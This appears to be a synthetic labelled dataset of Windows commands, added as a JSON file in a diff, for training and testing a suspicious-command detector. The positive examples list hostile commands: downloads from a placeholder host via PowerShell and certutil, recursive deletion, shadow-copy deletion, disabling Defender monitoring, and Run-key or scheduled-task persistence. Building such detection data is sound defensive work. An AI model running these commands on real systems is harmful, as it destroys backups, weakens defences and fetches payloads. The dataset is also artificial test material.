@@ -1,0 +1,358 @@
+{
+  "version": "aegis-command-synthetic-v2",
+  "synthetic": true,
+  "cases": [
+    {
+      "id": "train-normal-directory-1",
+      "split": "train",
+      "group": "normal-directory",
+      "label": "negative",
+      "command": "dir C:\\Lab\\Reports",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-directory-2",
+      "split": "train",
+      "group": "normal-directory",
+      "label": "negative",
+      "command": "dir D:\\Demo\\Notes",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-clock-1",
+      "split": "train",
+      "group": "normal-clock",
+      "label": "negative",
+      "command": "time /t",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-clock-2",
+      "split": "train",
+      "group": "normal-clock",
+      "label": "negative",
+      "command": "date /t",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-tasklist-1",
+      "split": "train",
+      "group": "normal-tasklist",
+      "label": "negative",
+      "command": "tasklist /fo table",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-tasklist-2",
+      "split": "train",
+      "group": "normal-tasklist",
+      "label": "negative",
+      "command": "tasklist /v",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-copy-1",
+      "split": "train",
+      "group": "normal-copy",
+      "label": "negative",
+      "command": "copy C:\\Lab\\a.txt C:\\Lab\\b.txt",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-copy-2",
+      "split": "train",
+      "group": "normal-copy",
+      "label": "negative",
+      "command": "copy D:\\Demo\\one.log D:\\Demo\\two.log",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-env-1",
+      "split": "train",
+      "group": "normal-env",
+      "label": "negative",
+      "command": "set PATH",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-env-2",
+      "split": "train",
+      "group": "normal-env",
+      "label": "negative",
+      "command": "set TEMP",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-help-1",
+      "split": "train",
+      "group": "normal-help",
+      "label": "negative",
+      "command": "help tree",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-normal-help-2",
+      "split": "train",
+      "group": "normal-help",
+      "label": "negative",
+      "command": "help echo",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-download-1",
+      "split": "train",
+      "group": "suspicious-download",
+      "label": "positive",
+      "command": "powershell -Command Invoke-WebRequest https://example.invalid/a.bin -OutFile C:\\Lab\\a.bin",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-download-2",
+      "split": "train",
+      "group": "suspicious-download",
+      "label": "positive",
+      "command": "powershell -Command Invoke-WebRequest https://example.invalid/b.bin -OutFile C:\\Lab\\b.bin",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-destroy-1",
+      "split": "train",
+      "group": "suspicious-destroy",
+      "label": "positive",
+      "command": "cmd /c del /s /q C:\\Lab\\Archive",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-destroy-2",
+      "split": "train",
+      "group": "suspicious-destroy",
+      "label": "positive",
+      "command": "cmd /c del /s /q D:\\Demo\\Archive",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-stop-1",
+      "split": "train",
+      "group": "suspicious-stop",
+      "label": "positive",
+      "command": "sc stop DemoService",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-stop-2",
+      "split": "train",
+      "group": "suspicious-stop",
+      "label": "positive",
+      "command": "sc stop LabService",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-encoded-1",
+      "split": "train",
+      "group": "suspicious-encoded",
+      "label": "positive",
+      "command": "powershell -EncodedCommand ZQBjAGgAbwA=",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-encoded-2",
+      "split": "train",
+      "group": "suspicious-encoded",
+      "label": "positive",
+      "command": "powershell -EncodedCommand VwByAGkAdABlAA==",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-defense-1",
+      "split": "train",
+      "group": "suspicious-defense",
+      "label": "positive",
+      "command": "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-defense-2",
+      "split": "train",
+      "group": "suspicious-defense",
+      "label": "positive",
+      "command": "powershell Set-MpPreference -DisableBehaviorMonitoring $true",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-backup-1",
+      "split": "train",
+      "group": "suspicious-backup",
+      "label": "positive",
+      "command": "vssadmin delete shadows /all /quiet",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "train-suspicious-backup-2",
+      "split": "train",
+      "group": "suspicious-backup",
+      "label": "positive",
+      "command": "vssadmin delete shadows /oldest /quiet",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-normal-ipconfig-1",
+      "split": "validation",
+      "group": "normal-ipconfig",
+      "label": "negative",
+      "command": "ipconfig /all",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-normal-ipconfig-2",
+      "split": "validation",
+      "group": "normal-ipconfig",
+      "label": "negative",
+      "command": "ipconfig /displaydns",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-normal-driverquery-1",
+      "split": "validation",
+      "group": "normal-driverquery",
+      "label": "negative",
+      "command": "driverquery /fo csv",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-normal-driverquery-2",
+      "split": "validation",
+      "group": "normal-driverquery",
+      "label": "negative",
+      "command": "driverquery /v",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-sus-registry-1",
+      "split": "validation",
+      "group": "sus-registry",
+      "label": "positive",
+      "command": "reg add HKCU\\Software\\Demo\\Run /v Lab /d sample.exe /f",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-sus-registry-2",
+      "split": "validation",
+      "group": "sus-registry",
+      "label": "positive",
+      "command": "reg add HKCU\\Software\\Demo\\Run /v Demo /d tool.exe /f",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-sus-scheduled-1",
+      "split": "validation",
+      "group": "sus-scheduled",
+      "label": "positive",
+      "command": "schtasks /create /tn DemoTask /tr C:\\Lab\\tool.exe /sc onlogon",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "validation-sus-scheduled-2",
+      "split": "validation",
+      "group": "sus-scheduled",
+      "label": "positive",
+      "command": "schtasks /create /tn LabTask /tr D:\\Demo\\tool.exe /sc onstart",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-normal-whoami-1",
+      "split": "test",
+      "group": "normal-whoami",
+      "label": "negative",
+      "command": "whoami /groups",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-normal-whoami-2",
+      "split": "test",
+      "group": "normal-whoami",
+      "label": "negative",
+      "command": "whoami /priv",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-normal-search-1",
+      "split": "test",
+      "group": "normal-search",
+      "label": "negative",
+      "command": "findstr /i error C:\\Lab\\demo.log",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-normal-search-2",
+      "split": "test",
+      "group": "normal-search",
+      "label": "negative",
+      "command": "findstr /n warning D:\\Demo\\notes.txt",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-sus-certutil-1",
+      "split": "test",
+      "group": "sus-certutil",
+      "label": "positive",
+      "command": "certutil -urlcache -split -f https://example.invalid/payload C:\\Lab\\p.bin",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-sus-certutil-2",
+      "split": "test",
+      "group": "sus-certutil",
+      "label": "positive",
+      "command": "certutil -urlcache -split -f https://example.invalid/agent D:\\Demo\\a.bin",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-sus-rundll-1",
+      "split": "test",
+      "group": "sus-rundll",
+      "label": "positive",
+      "command": "rundll32.exe javascript:DemoEntry",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "test-sus-rundll-2",
+      "split": "test",
+      "group": "sus-rundll",
+      "label": "positive",
+      "command": "rundll32.exe javascript:LabEntry",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "ambiguous-amb-admin-1",
+      "split": "ambiguous",
+      "group": "amb-admin",
+      "label": "unknown",
+      "command": "powershell Get-Service",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "ambiguous-amb-admin-2",
+      "split": "ambiguous",
+      "group": "amb-admin",
+      "label": "unknown",
+      "command": "powershell Get-Process",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "ambiguous-amb-net-1",
+      "split": "ambiguous",
+      "group": "amb-net",
+      "label": "unknown",
+      "command": "net use",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    },
+    {
+      "id": "ambiguous-amb-net-2",
+      "split": "ambiguous",
+      "group": "amb-net",
+      "label": "unknown",
+      "command": "netstat -ano",
+      "reason": "synthetic triage context; intent cannot be established by command alone"
+    }
+  ]
+}
